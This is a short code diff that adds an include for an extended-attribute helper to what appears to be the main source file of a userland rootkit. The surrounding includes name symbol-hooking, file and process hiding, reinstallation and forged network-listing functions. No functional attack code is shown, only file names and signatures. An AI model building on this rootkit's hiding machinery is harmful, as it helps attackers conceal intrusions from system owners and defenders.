@@ -47,6 +47,7 @@
 #include "symbols/hiding/libdl/dlsym.c" // (void *dlsym(), void locate_dlsym(), void *locate_sym())
 #include "symbols/util/dup.c" // (char *dup_call())
 #include "symbols/util/procname.h" // (char *procname_self())
+#include "symbols/util/modify_xattr.c" // (int modify_xattr(char *path, int mode)
 #include "symbols/hiding/reinstall.c" // (void reinstall(), int hide_vlany())
 #include "symbols/hiding/hide_checks.c" // (int hidden_xattr(), int hidden(), int hiddenGID(), int hiddenDirectory())
 #include "symbols/hiding/forge_proc_net.c" // (FILE *forge_proc_net_tcp())
